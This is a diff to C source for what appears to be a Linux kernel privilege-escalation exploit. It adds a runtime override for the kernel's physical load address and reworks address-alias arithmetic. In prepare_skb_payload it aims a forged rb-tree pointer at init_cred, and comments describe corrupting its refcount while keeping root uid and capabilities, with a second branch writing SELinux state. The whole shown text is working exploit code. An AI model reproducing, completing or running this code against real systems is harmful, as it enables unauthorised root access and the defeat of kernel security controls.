@@ -1,4 +1,5 @@
 #include "common.h"
+#include "runtime_struct_offsets.h"
 #include "kernelsnitch/kernelsnitch.h"
 
 static struct kernelsnitch_shared_state *ks;
@@ -265,14 +266,26 @@ int has_zero_byte(uintptr_t value) {
   return 0;
 }
 
+/* The selected kernel entry supplies its physical image load address. */
+uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
+uintptr_t g_init_cred_image = INIT_CRED;
+
+void init_p0_profile(void) {
+  char *v = getenv("KPHYS");
+  if (v) p0_kernel_phys_load = strtoull(v, NULL, 0);
+  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
+          (unsigned long long)p0_kernel_phys_load,
+          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
+}
+
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+  uintptr_t phys = p0_kernel_phys_load + off;
   return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - P0_PHYS_OFFSET);
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -494,7 +507,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
            * child->__rb_parent_color corrupts init_cred.usage (bytes 0-7)
            * but that's just a ref count — large value = won't be freed.
            * uid/caps/security/user_ns all stay intact at offsets 8+. */
-          fake_right = data_addr(INIT_CRED);
+          fake_right = data_addr(g_init_cred_image);
         } else {
           /* Write 1 (selinux): child = base+0x100 → byte0=0, byte1=1 */
           fake_right = base + 0x100;
